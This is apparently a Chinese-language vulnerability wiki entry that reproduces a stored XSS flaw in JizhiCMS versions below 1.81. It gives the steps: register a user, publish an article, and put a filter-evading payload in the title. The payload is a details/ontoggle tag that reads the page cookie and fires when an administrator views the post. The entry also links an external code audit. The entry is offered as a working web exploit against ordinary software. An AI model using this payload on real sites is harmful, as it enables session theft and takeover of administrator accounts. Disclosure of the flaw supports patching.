# 极致CMS 1.81以下版本 存储型XSS

### 漏洞复现

登录管理员添加模块

![]( http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/jizhi-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

注册用户

![]( http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/jizhi-2.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

点击发布文章

![]( http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/jizhi-3.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

在文章标题处插入xss payload

```<details open ontoggle= confirm(document[`coo`+`kie`])>```

当管理员访问时XSS成功

![]( http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/jizhi-4.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)



### 参考

[极致CMS代码审计](https://xz.aliyun.com/t/7861)